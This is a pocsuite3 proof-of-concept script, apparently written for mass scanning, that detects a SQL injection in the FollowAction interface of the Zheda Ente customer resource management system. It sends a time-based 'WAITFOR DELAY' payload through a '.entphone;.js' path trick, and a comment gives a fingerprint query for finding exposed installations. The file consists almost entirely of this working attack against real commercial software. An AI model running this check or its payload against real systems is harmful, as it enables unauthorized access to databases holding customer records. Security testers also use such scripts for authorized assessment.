# _*_ coding:utf-8 _*_
# @Time : 2024/2/20
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class zdek_followaction_sql(POCBase):
    pocDesc = '''浙大恩特客户资源管理系统-FollowAction接口存在SQL注入漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-2-20'
    name = "浙大恩特客户资源管理系统-FollowAction接口存在SQL注入漏洞"
    #title="欢迎使用浙大恩特客户资源管理系统" || body="script/Ent.base.js" || app="浙大恩特客户资源管理系统"

    def _verify(self):

        result = {}
        url = self.url+ '/entsoft/FollowAction.entphone;.js'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
            "Accept": "*/*",
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Connection': 'close'
        }
        try:

            data='method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:4%27--'
            response = requests.post(url, headers=headers,data=data)
            if response.status_code == 200 and response.elapsed.total_seconds() >= 4:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(zdek_followaction_sql)